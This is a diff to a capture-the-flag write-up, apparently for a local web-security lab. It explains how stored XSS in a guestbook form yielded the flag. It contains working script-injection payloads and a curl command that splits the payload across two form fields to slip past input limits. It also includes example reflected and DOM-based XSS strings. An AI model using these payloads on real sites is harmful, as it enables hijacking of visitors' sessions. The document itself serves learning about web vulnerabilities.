@@ -2,7 +2,7 @@
 
 ## Summary
 
-page: `http://localhost:8080/index.php?page=feedback`
+page: `http://localhost:8081/index.php?page=feedback`
 commands: In the guestbook form, enter in the **Name** field:
 ```
 test
@@ -13,13 +13,21 @@ and in the **Message** field:
 ```
 Or via curl:
 ```bash
-curl -X POST "http://localhost:8080/index.php?page=feedback" \
-     -d "txtName=test&mtxtMessage=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&btnSign=Sign+Guestbook" | grep flag
+curl -X POST "http://localhost:8081/index.php?page=feedback" \
+     -d "txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" | grep flag
 ```
 
 ## Details
 
-The guestbook page is vulnerable to XSS.
+This is a **Stored XSS** (also called Persistent XSS). There are 3 types:
+
+| Type | How it works | Example |
+|---|---|---|
+| **Stored** (Persistent) | Payload is saved on the server (database). Every user who views the page gets hit. | Guestbook comment with `<script>` — this exploit ✅ |
+| **Reflected** (Non-Persistent) | Payload is in the URL/request and immediately bounced back in the response. Only affects who clicks the link. | `search.php?q=<script>alert(1)</script>` |
+| **DOM-based** | Payload never reaches the server. JavaScript on the page reads from the URL/DOM and unsafely inserts it. | `page.html#<img onerror=alert(1)>` |
+
+This guestbook is **Stored XSS** because the `<script>` tag is saved in the database and rendered for every visitor who loads the page.
 
 I entered a <script>alert('XSS')</script in the comment box and got the flag
 
